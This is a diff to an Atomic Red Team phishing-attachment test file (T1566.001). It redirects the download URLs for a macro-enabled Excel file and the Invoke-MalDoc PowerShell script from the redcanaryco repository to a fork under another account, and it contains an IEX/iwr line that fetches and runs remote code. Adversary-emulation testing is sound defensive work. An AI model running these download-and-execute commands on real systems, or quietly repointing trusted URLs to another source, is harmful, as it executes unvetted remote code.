@@ -14,7 +14,7 @@ atomic_tests:
         return 'Please install Microsoft Excel before running this test.'
       }
       else{
-        $url = 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'
+        $url = 'https://github.com/theclintox/atomic-red-team/blob/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'
         $fileName = 'PhishingAttachment.xlsm'
         New-Item -Type File -Force -Path $fileName | out-null
         $wc = New-Object System.Net.WebClient
@@ -55,7 +55,7 @@ atomic_tests:
       Stop-Process -Name WINWORD
   executor:
     command: |
-      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+      IEX (iwr "https://raw.githubusercontent.com/theclintox/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
       $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
       Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
     cleanup_command: |
